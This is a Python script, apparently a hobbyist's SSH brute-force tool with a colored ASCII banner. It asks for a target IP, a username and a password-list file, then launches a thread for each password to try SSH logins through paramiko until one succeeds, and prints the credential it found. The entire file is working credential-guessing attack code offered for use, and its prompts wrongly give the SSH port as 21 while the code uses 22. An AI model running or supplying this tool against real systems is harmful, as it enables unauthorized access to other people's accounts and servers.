import paramiko, sys, os, socket, termcolor
import threading, time
stop_flag = 0
c = termcolor.colored

print(c("       _____ _____ _    _            ____             _        ", "green"))
print(c("      / ____/ ____| |  | |          |  _ \           | |       ", "blue"))
print(c("     | (___| (___ | |__| |  ______  | |_) |_ __ _   _| |_ ___  ", "white"))
print(c("      \___ \ ___ \|  __  | |______| |  _ <| '__| | | | __/ _ \ ", "red"))
print(c("      ____) |___) | |  | |          | |_) | |  | |_| | ||  __/ ", "yellow"))
print(c("     |_____/_____/|_|  |_|          |____/|_|   \__,_|\__\___| ", "magenta"))
print("   <<<<<----->= SSH Brute Forcer By: IAmFalseBeliefs <=----->>>>>")
print("     <<<<<----->=          Brutes Made Easy         <=----->>>>>")
print(c("<<<<<----->= Use my PortScanner to see if ssh is open <=----->>>>>", "blue"))
print(c("     <<<<<----->= I used multi-threading for this <=----->>>>>", "yellow"))
print("\n")
                                                          


host = input("[----] Target IP address (SSH port 21): ")
username = input("[----] Target Username (SSH port 21): ")
pass_file = input("[----] Password file path: ")
print("[----] Attempting brute force on " + username + " on host: " + host)

def ssh_connect(password, code = 0):
	global stop_flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port = 22, username = username, password = password)
		stop_flag = 1
		print(c("[----] Brute complete use password: " + password + " for Account: " + username, "green"))
	except:
		print(c("[----] Incorrect password: " + password, "red"))
	ssh.close()

if os.path.exists(pass_file) == False:
	print("[=--=] Check spelling, file doesnt exist")
	sys.exit(1)

with open(pass_file, 'r') as file:
	for line in file.readlines():
		if stop_flag == 1:
			t.join()
			exit()
		password = line.strip()
		t = threading.Thread(target = ssh_connect, args = (password,))
		t.start()
		time.sleep(0.5)